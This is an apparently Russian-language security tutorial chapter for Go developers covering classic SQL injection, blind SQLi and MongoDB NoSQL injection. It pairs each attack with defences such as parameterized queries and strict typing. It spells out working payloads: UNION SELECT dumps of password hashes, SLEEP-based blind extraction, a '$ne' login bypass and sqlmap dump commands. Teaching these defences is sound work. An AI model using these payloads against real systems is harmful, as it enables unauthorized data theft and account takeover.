# 🛡️ Глава 2: SQL-инъекции (SQLi) — Когда база данных рассказывает лишнее

## Часть 1: Классическая SQL-инъекция — читаем чужие данные

### 🎯 Конкретный инцидент

Твой финтех-стартап растёт. Ты написал микросервис на Go, который отдаёт профили пользователей по ID. У тебя endpoint:

```
GET /api/users?id=42
```

Бэкенд-код выглядит примерно так:

```go
func userHandler(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    query := "SELECT id, username, email, role FROM users WHERE id = " + id
    row := db.QueryRow(query)
    // сканируем и возвращаем JSON
}
```

Я — хакер. Я сижу у себя в браузере и пробую:

```
GET /api/users?id=1
```

```json
{"id":1, "username":"alice", "email":"alice@startup.com", "role":"user"}
```

Работает. Теперь я пробую то, что ни один нормальный пользователь не сделает:

```
GET /api/users?id=1 OR 1=1
```

Что происходит на бэкенде? Строка `id` подставляется в SQL:

```sql
SELECT id, username, email, role FROM users WHERE id = 1 OR 1=1
```

`1=1` — это всегда истина. `WHERE id = 1 OR истина` = вся таблица. Твой сервер послушно отдаёт мне ВСЕХ пользователей. Все логины, все email'ы, все роли. Возможно, и хеши паролей, если они в той же таблице.

Я только что прочитал твою базу данных через легитимный endpoint. Это классическая SQL-инъекция.

*(SQL Injection — атака на базу данных, при которой злоумышленник внедряет вредоносный SQL-код в легитимный запрос через поля ввода. Входит в OWASP Top 10 A03:2021 — Injection. Эксплуатирует отсутствие разделения между SQL-кодом и данными при формировании запроса конкатенацией строк. Может приводить к чтению, изменению и удалению данных, а в некоторых СУБД — к выполнению команд ОС.)*

### 🧠 Как работает SQL-инъекция: цепочка рассуждений

**Вопрос 1: Почему конкатенация строк для SQL — это проблема?**

SQL — это язык. У него есть синтаксис, ключевые слова, структура. Когда ты формируешь запрос конкатенацией, ты смешиваешь **код** (структуру запроса) и **данные** (значения полей) в одной строке. База данных получает эту строку и парсит её. Она не знает, что `1 OR 1=1` — это пользовательский ввод, а не часть запроса.

Метафора: представь, что ты пишешь программу на Go, но вместо передачи аргументов в функцию ты генерируешь Go-код в строку, добавляешь в него пользовательский ввод, а потом выполняешь через `go run`. Это безумие, правда? Но именно так работает конкатенация SQL-запросов.

**Вопрос 2: Что именно можно сделать через SQL-инъекцию?**

Зависит от СУБД и прав пользователя, от имени которого выполняется запрос. По нарастающей опасности:

1. **Чтение данных (Confidentiality):** `UNION SELECT` — объединить результат легитимного запроса с любыми другими данными из БД. Прочитать другие таблицы, включая `information_schema` (метаданные обо всей БД).

2. **Изменение данных (Integrity):** `UPDATE`, `INSERT`, `DELETE` — изменить баланс счёта, удалить заказы, подменить email администратора.

3. **Выполнение команд ОС:** В PostgreSQL через `COPY ... FROM PROGRAM`, в MySQL через `INTO OUTFILE`. Это превращает SQL-инъекцию в захват сервера.

4. **Чтение файлов:** В PostgreSQL `pg_read_file()`, в MySQL `LOAD_FILE()`. Прочитать `/etc/passwd`, исходники приложения, конфиги с паролями.

**Вопрос 3: А разве недостаточно просто экранировать кавычки? Что вообще такое экранирование?**

Некоторые разработчики думают: «Я просто прогоню пользовательский ввод через функцию, которая удваивает кавычки, и всё будет безопасно». Это не так по двум причинам: экранирование легко обходится в числовых полях, и оно принципиально менее надёжно, чем параметризация. Но чтобы понять почему, нужно сначала разобраться, что такое экранирование.

**Что такое экранирование**

*(SQL Escaping — процесс замены специальных символов в строке на их безопасное представление, чтобы интерпретатор SQL воспринял их как обычный текст, а не как часть синтаксиса. Основной специальный символ в SQL-строках — одиночная кавычка `'`, которая экранируется удвоением: `'` → `''`. Однако экранирование не защищает от инъекций в числовых полях, уязвимо к обходу через multi-byte кодировки и не рекомендуется как основной метод защиты. Параметризованные запросы являются предпочтительным подходом.)*

Представь, что SQL-парсер читает твой запрос слева направо. Он видит открывающую кавычку `'` — значит, началась строка. Он читает символы внутрь строки, пока не встретит **закрывающую** кавычку. Если пользователь вводит текст, содержащий кавычку, парсер ошибочно принимает её за конец строки, и остаток пользовательского ввода вырывается наружу и интерпретируется как SQL-код.

Экранирование решает эту проблему: перед тем как подставить пользовательский ввод в SQL-строку, мы удваиваем каждую кавычку внутри него. `'` превращается в `''`. Теперь SQL-парсер, дойдя до `''`, понимает: «Это не конец строки, это экранированная кавычка внутри строки».

**Пример экранирования на Go (вручную, через `strings.ReplaceAll`)**

```go
package main

import (
    "fmt"
    "strings"
)

func escapeSQLString(input string) string {
    // Удваиваем каждую одиночную кавычку
    escaped := strings.ReplaceAll(input, "'", "''")
    // Обрабатываем обратный слеш, чтобы он сам не сломал экранирование
    escaped = strings.ReplaceAll(escaped, "\\", "\\\\")
    return escaped
}

func main() {
    userInput := "O'Brien"
    safe := escapeSQLString(userInput)
    fmt.Println(safe) // O''Brien

    // Теперь это безопасно подставить в SQL-строку в кавычках
    query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", safe)
    fmt.Println(query)
    // SELECT * FROM users WHERE name = 'O''Brien'
    // SQL-парсер видит: строка "O'Brien", кавычка внутри экранирована
}
```

**Пример экранирования на Go (через функцию драйвера БД)**

Стандартная библиотека `database/sql` и драйверы (pgx, lib/pq, go-sql-driver/mysql) **сами** экранируют значения, если ты используешь параметризованные запросы. Тебе не нужно вызывать функцию экранирования вручную:

```go
import "database/sql"

// Параметризованный запрос — драйвер сам всё экранирует
name := "O'Brien"
row := db.QueryRow("SELECT * FROM users WHERE name = $1", name)
// Драйвер передаст значение отдельно, БД не спутает кавычку в имени с концом строки
```

Но если ты по каким-то причинам строишь SQL-строку вручную (что мы категорически не рекомендуем), ты можешь использовать функцию экранирования из драйвера. Например, для PostgreSQL через `pq.QuoteLiteral`:

```go
import "github.com/lib/pq"

userInput := "O'Brien"
safe := pq.QuoteLiteral(userInput)
fmt.Println(safe) // 'O''Brien'
```

**Почему экранирование ненадёжно как основной метод защиты**

Даже идеально написанная функция экранирования не защищает от всех атак:

1. **Числовые поля не используют кавычки.** `SELECT * FROM users WHERE id = 1 OR 1=1` — здесь нет ни одной кавычки, экранирование бесполезно.

2. **Экранирование зависит от контекста, и хакеры находят обходы.** Классический пример — multi-byte кодировки (например, GBK): если СУБД ожидает GBK, а ты экранируешь для ASCII, злоумышленник может подобрать последовательность байт, где `\` и следующий символ образуют валидный multi-byte символ, и экранирование исчезает.

3. **Человеческий фактор:** легко забыть вызвать `escapeSQLString()` в одном из десяти мест, где формируется запрос. В большом проекте с десятками разработчиков кто-то обязательно забудет.

Параметризованные запросы решают всё это на корню: значения вообще не проходят через SQL-парсер как часть запроса. Они передаются отдельно, и БД точно знает, что это данные, а не код.

Так что ответ на вопрос «недостаточно ли экранирования?» — нет, недостаточно. Параметризованные запросы — это другой, фундаментально более надёжный подход.

### 🔬 Анатомия SQL-инъекции: от простого к опасному

**Шаг 1: Обнаружение уязвимости**

Я, хакер, пробую специальные символы, которые ломают SQL-синтаксис:

```
GET /api/users?id=1'
```

Если сервер возвращает ошибку типа `You have an error in your SQL syntax`, `unterminated quoted string`, `pg_query(): Query failed` — я знаю, что инъекция возможна. Твой сервер раскрыл не только факт уязвимости, но и тип СУБД.

**Шаг 2: Определение количества колонок в оригинальном запросе**

Я хочу использовать `UNION SELECT`, чтобы прочитать другие таблицы. Но `UNION` требует, чтобы количество колонок совпадало с оригинальным запросом. Я подбираю через `ORDER BY`:

```
GET /api/users?id=1 ORDER BY 1  — работает
GET /api/users?id=1 ORDER BY 2  — работает
GET /api/users?id=1 ORDER BY 3  — работает
GET /api/users?id=1 ORDER BY 4  — работает
GET /api/users?id=1 ORDER BY 5  — ошибка!
```

Оригинальный запрос возвращает 4 колонки.

**Шаг 3: UNION-инъекция — читаем другие таблицы**

Теперь я знаю, что в оригинальном запросе 4 колонки. Я делаю:

```
GET /api/users?id=-1 UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables
```

Что происходит в SQL:

```sql
SELECT id, username, email, role FROM users WHERE id = -1
UNION
SELECT 1, table_name, 3, 4 FROM information_schema.tables
```

`id = -1` не существует — первая часть запроса возвращает пустой результат. Вторая часть выбирает список ВСЕХ таблиц в БД. Твой API возвращает мне:

```json
{"id":1, "username":"users", "email":"3", "role":"4"}
{"id":1, "username":"payments", "email":"3", "role":"4"}
{"id":1, "username":"sessions", "email":"3", "role":"4"}
```

Теперь я знаю структуру твоей БД.

**Шаг 4: Чтение чувствительных данных**

Я нахожу интересную таблицу — скажем, `users`. Я хочу прочитать пароли. Но я не знаю точные имена колонок. Я запрашиваю их из `information_schema.columns`:

```
GET /api/users?id=-1 UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users'
```

Получаю: `id`, `username`, `password_hash`, `email`, `role`. Теперь читаю:

```
GET /api/users?id=-1 UNION SELECT 1, username, password_hash, email FROM users
```

Только что я украл всю таблицу пользователей с хешами паролей.

### 💻 SQLmap — автоматизация атаки (Red Team)

Ручной подбор — это долго. Хакеры используют `sqlmap`, который делает всё автоматически:

```bash
# Базовая проверка
sqlmap -u "http://target.com/api/users?id=1"

# Если найдена уязвимость — дамп всех БД
sqlmap -u "http://target.com/api/users?id=1" --dbs

# Дамп конкретной таблицы
sqlmap -u "http://target.com/api/users?id=1" -D myapp -T users --dump
```

`sqlmap` сам определяет:
- Тип СУБД
- Тип инъекции (union-based, boolean-based blind, time-based blind, error-based)
- Структуру БД
- И автоматически извлекает данные

### 🛡️ Защита: Параметризованные запросы в Go (Blue Team)

*(Parameterized Queries / Prepared Statements — техника отделения SQL-кода от данных. Запрос отправляется СУБД с плейсхолдерами (`$1`, `?`) вместо значений. СУБД парсит запрос и строит план выполнения. Значения передаются отдельно и гарантированно интерпретируются как литералы, а не как SQL-код. Это предотвращает любые SQL-инъекции, независимо от типа поля и содержимого пользовательского ввода.)*

Решение — параметризованные запросы. Вместо конкатенации строк ты говоришь БД: «Вот структура запроса, вот значения отдельно». БД точно знает, где код, а где данные.

**Неправильно (конкатенация):**
```go
query := "SELECT * FROM users WHERE id = " + id
row := db.QueryRow(query)
```

**Правильно (параметризованный запрос):**
```go
query := "SELECT id, username, email, role FROM users WHERE id = $1"
row := db.QueryRow(query, id)
```

`$1` — это плейсхолдер для PostgreSQL. Для MySQL — `?`, для SQL Server — `@p1`. Но смысл один: значение `id` передаётся отдельно от запроса, БД обрабатывает его как данные, а не как часть SQL-кода.

**Почему это безопасно?**

Когда ты используешь параметризованный запрос, драйвер БД (например, `pgx` для PostgreSQL) делает следующее:

1. Отправляет СУБД шаблон запроса: `SELECT ... WHERE id = $1`
2. СУБД парсит запрос, строит план выполнения, оптимизирует
3. Отправляет значения параметров отдельно: `["42 OR 1=1"]`
4. СУБД подставляет значения в уже готовый план

Хакерская строка `42 OR 1=1` будет воспринята как **литерал** — просто текст, который нужно сравнить с `id`. СУБД будет искать запись, где `id` в точности равен строке `"42 OR 1=1"`, а не выполнять `OR 1=1` как условие.

**Пример с разными СУБД в Go:**

```go
// PostgreSQL
db.QueryRow("SELECT * FROM users WHERE id = $1", id)

// MySQL
db.QueryRow("SELECT * FROM users WHERE id = ?", id)

// SQL Server
db.QueryRow("SELECT * FROM users WHERE id = @p1", id)
```

**ORM тоже уязвимы, если использовать их неправильно**

GORM — популярная ORM для Go. Но даже с ней можно допустить инъекцию:

```go
// ❌ Опасно! GORM подставит строку как есть
db.Raw("SELECT * FROM users WHERE id = " + id).Scan(&user)

// ✅ Безопасно! Параметризованный raw-запрос
db.Raw("SELECT * FROM users WHERE id = ?", id).Scan(&user)

// ✅ Безопасно! Методы GORM автоматически параметризуют
db.First(&user, id)
```

### 📝 Что мы узнали?
- SQL-инъекция возникает, когда пользовательский ввод смешивается с SQL-кодом через конкатенацию строк
- Атака может читать, изменять и удалять данные, а в ряде случаев — выполнять команды ОС
- Экранирование кавычек — это временная мера, которая не защищает от всех типов атак (особенно в числовых полях)
- Параметризованные запросы с плейсхолдерами (`$1`, `?`) решают проблему в корне, разделяя код и данные
- ORM не защищают автоматически — нужно использовать их правильно

### 💥 Типичные ошибки
- **Ошибка:** «Я экранирую кавычки, я в безопасности»
    - **Правда:** Экранирование не защищает от инъекций в числовых полях. Параметризация — это другой, фундаментально более надёжный подход.
- **Ошибка:** «Я использую ORM, я в безопасности»
    - **Правда:** `db.Raw()` с конкатенацией всё ещё уязвим. ORM — это удобно, но не волшебно.
- **Ошибка:** Прятать ошибки БД от пользователя и думать, что это защищает
    - **Правда:** Это не защита, это маскировка. Blind SQL-инъекция работает даже без вывода ошибок. Хакер может извлекать данные по биту, анализируя время ответа или разницу в поведении.

### 🔁 Для быстрого повторения
- **SQLi:** внедрение SQL-кода через пользовательский ввод при конкатенации строк
- **Экранирование:** `'` → `''`, но не защищает числовые поля и обходится через multi-byte кодировки
- **Параметризация:** единственный надёжный метод, значения передаются отдельно от кода
- **Типы SQLi:** Union-based, Error-based, Boolean-based blind, Time-based blind
- **Go:** `db.QueryRow("... WHERE id = $1", id)` — безопасно; конкатенация — никогда
- **Инструмент атаки:** sqlmap

## Часть 2: Blind SQL-инъекция — когда сервер молчит

### 🎯 Конкретный инцидент

Ты прочитал про SQL-инъекции и убрал вывод ошибок БД. Твой сервер теперь отвечает на ошибки нейтральным `{"error": "Internal Server Error"}`. Хакер пробует `?id=1'` и не видит синтаксической ошибки. Ты в безопасности?

Нет. Теперь я, хакер, использую **Blind SQL-инъекцию** — извлечение данных по крупицам, без единой ошибки в ответе.

*(Blind SQL Injection — разновидность SQL-инъекции, при которой сервер не возвращает сообщений об ошибках и не выводит результаты запроса напрямую. Злоумышленник извлекает данные через логический вывод: boolean-based — анализ разницы в ответах на true/false условия, и time-based — анализ задержек ответа при истинном условии через функции SLEEP()/pg_sleep(). Требует больше запросов, но так же эффективна, как и классическая SQLi.)*

---

### 🧠 Два типа Blind SQLi: булева и временная

**Boolean-based Blind SQLi**

Я задаю БД вопросы, на которые можно ответить «да» или «нет». Разница в ответе сервера подсказывает мне правильный ответ.

Пробую:

```
GET /api/users?id=1 AND 1=1   → статус 200, данные пользователя 1
GET /api/users?id=1 AND 1=2   → статус 200, но пустой ответ (пользователь не найден)
```

Это значит, что мои условия работают. Теперь я могу спрашивать БД:

```
id=1 AND (SELECT substring(username,1,1) FROM users WHERE id=1) = 'a'   → пусто (false)
id=1 AND (SELECT substring(username,1,1) FROM users WHERE id=1) = 'b'   → пусто (false)
id=1 AND (SELECT substring(username,1,1) FROM users WHERE id=1) = 'A'   → данные пользователя 1 (true!)
```

Первый символ username для пользователя с id=1 — 'A'. Повторяя это для каждого символа, я могу извлечь любое значение из БД. Медленно, но верно.

**Time-based Blind SQLi**

Если сервер возвращает одинаковый ответ на true и false, я использую задержки:

```
id=1 AND IF(1=1, SLEEP(5), 0)   → сервер думает 5 секунд
id=1 AND IF(1=2, SLEEP(5), 0)   → ответ мгновенный
```

Теперь я могу задавать вопросы по времени ответа:

```
id=1 AND IF((SELECT substring(username,1,1) FROM users WHERE id=1) = 'A', SLEEP(5), 0)
```

Если сервер «завис» на 5 секунд — первая буква 'A'. Если ответил быстро — пробую следующую букву.

---

### 🛡️ Защита та же — параметризованные запросы

Blind SQLi не требует нового метода защиты. Параметризованные запросы предотвращают любую инъекцию, потому что злоумышленник никогда не сможет внедрить SQL-код в плейсхолдер. Значение `"1 AND 1=1"` будет искаться как буквальная строка, а не как условие.

---

### 📝 Что мы узнали?
- Blind SQLi работает даже без вывода ошибок и данных
- Boolean-based: логические условия, ответ виден по наличию/отсутствию данных
- Time-based: задержки, ответ виден по времени выполнения
- Параметризованные запросы защищают от всех типов SQLi

### 🔁 Для быстрого повторения
- **Boolean-based Blind:** `AND условие` → true (данные есть) / false (данных нет)
- **Time-based Blind:** `AND IF(условие, SLEEP(N), 0)` → задержка при true
- **Защита:** та же — параметризованные запросы

## Часть 3: NoSQL-инъекции — когда SQLi не при чём

### 🎯 Конкретный инцидент

Ты перешёл на MongoDB. SQL-инъекции тебе больше не страшны. У тебя endpoint логина, который принимает JSON:

```json
{"username": "alice", "password": "supersecret"}
```

Бэкенд на Go делает что-то вроде:

```go
var input map[string]interface{}
json.NewDecoder(r.Body).Decode(&input)
result := collection.FindOne(ctx, input)
```

Я, хакер, отправляю:

```json
{"username": "admin", "password": {"$ne": ""}}
```

Что происходит в MongoDB? `$ne` — это оператор «не равно». Запрос превращается в: «найди пользователя admin, у которого пароль не равен пустой строке». MongoDB находит админа и логинит меня без знания пароля.

*(NoSQL Injection — инъекция в нереляционные базы данных, эксплуатирующая особенности операторов. В MongoDB — операторы с префиксом `$` (`$ne`, `$gt`, `$where`). Возникает, когда пользовательский ввод интерпретируется как часть запроса, а не как литеральное значение. Аналогична SQLi по сути, но отличается синтаксисом и методами эксплуатации.)*

---

### 🛡️ Защита: строгая типизация вместо map

Проблема в том, что код принимает `map[string]interface{}` и передаёт его напрямую в MongoDB. Решение — использовать строгую структуру и валидацию:

```go
// Строгая структура вместо map
type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

var input LoginRequest
json.NewDecoder(r.Body).Decode(&input)

// Теперь $ne будет строкой "$ne", а не оператором
filter := bson.M{
    "username": input.Username,
    "password": input.Password,
}
result := collection.FindOne(ctx, filter)
```

Теперь `"$ne"` — это просто строка из восьми символов, а не оператор MongoDB.

---

### 📝 Что мы узнали?
- NoSQL-инъекции работают по тому же принципу, что и SQLi: пользовательский ввод интерпретируется как код
- В MongoDB опасны операторы с префиксом `$` (`$ne`, `$gt`, `$where`)
- Защита: строгая типизация, не передавать сырой `map[string]interface{}` в запрос

### 🔁 Для быстрого повторения
- **NoSQL Injection:** операторы `$ne`, `$gt`, `$regex` в пользовательском вводе
- **MongoDB:** `{"$ne": ""}` обходит проверку пароля
- **Защита:** строгие структуры, не `map[string]interface{}` для фильтров

### ✅ Ответы на вопросы для самопроверки

1.  При конкатенации СУБД получает готовую SQL-строку и парсит её целиком, не различая код и данные. При параметризации драйвер отправляет шаблон запроса (`... WHERE id = $1`) отдельно, СУБД его парсит и строит план выполнения. Затем значения параметров отправляются отдельно и подставляются в уже готовый план как литералы. СУБД гарантированно интерпретирует их как данные, а не как код.

2.  Экранирование — замена специальных символов на безопасное представление. В SQL основной специальный символ — одиночная кавычка `'`, она экранируется удвоением: `'` → `''`. Пример на Go: `strings.ReplaceAll(input, "'", "''")`. Этого недостаточно, потому что: (1) числовые поля не используют кавычки, инъекция работает без них; (2) возможны обходы через multi-byte кодировки; (3) легко забыть вызвать функцию экранирования в одном из многих мест формирования запроса.

3.  Это говорит о том, что ввод пользователя напрямую попадает в SQL-парсер и ломает синтаксис. Вероятно, поле подставляется в запрос без параметризации. Но это не гарантированная уязвимость: возможно, сервер просто некорректно обрабатывает ошибки, а сам запрос параметризован, а ошибка происходит где-то ещё. Нужно проверить дополнительными тестами (например, `?q=hello' OR '1'='1`).

4.  Boolean-based: разница в контенте ответа (пользователь найден vs не найден). Time-based: разница во времени ответа (SLEEP при истине). Time-based используется, когда сервер возвращает одинаковый ответ на true и false (нет разницы в контенте). Например, если запрос всегда возвращает 200 OK с одинаковым сообщением.

5.  Правильная параметризация:
    ```go
    db.Raw("SELECT * FROM users WHERE name LIKE $1", "%"+search+"%")
    ```
    Особое внимание нужно, потому что символы `%` и `_` в `LIKE` имеют специальное значение (wildcards). Если пользователь может вставить `%` — он получит все записи. Нужно экранировать пользовательские `%` и `_` в search, если они не должны быть wildcards.

6.  `{"$gt": ""}` — оператор «больше чем пустая строка». MongoDB найдёт любого пользователя, чьё имя лексикографически больше пустой строки (то есть почти любого). Защита: использовать строгую типизацию. Принимать `input` как `string`, а не как `interface{}`. Тогда `$gt` будет строкой из трёх символов, а не оператором.

7.  **Безопасны:** `db.First(&user, id)`, `db.Where("id = ?", id).Find(&users)`, `db.Create(&user)`. **Опасны:** `db.Raw("SELECT * FROM users WHERE id = " + id)` — конкатенация в Raw. **Требуют осторожности:** `db.Where("name LIKE ?", "%"+search+"%")` — нужно помнить про wildcards в LIKE. `db.Order(userInput)` — не допускать произвольных строк для сортировки без белого списка.

8.  После получения списка таблиц хакер: (1) получает список колонок для целевой таблицы через `UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'`. (2) Зная имена колонок, извлекает данные: `UNION SELECT username, password_hash FROM users`. (3) Может добавить `WHERE` для фильтрации конкретных записей.

9.  Скрытие ошибок — это security through obscurity. Time-based Blind SQLi не требует ошибок: хакер использует `SLEEP()` или `pg_sleep()`. Если условие истинно — запрос выполняется дольше. Хакер измеряет время ответа и на основе этого извлекает данные по одному биту. Скрытие ошибок замедляет, но не останавливает атаку.

10. **Недостаточно.** С правами только на `SELECT` хакер может: (1) прочитать все таблицы и все данные (утечка конфиденциальности), (2) прочитать `information_schema` и узнать структуру БД для дальнейших атак, (3) в некоторых СУБД — читать файлы через `pg_read_file()` или `LOAD_FILE()`, (4) выполнить DoS через тяжелые запросы (сложные JOIN'ы, декартово произведение). Принцип наименьших привилегий важен, но не заменяет защиту от инъекций.
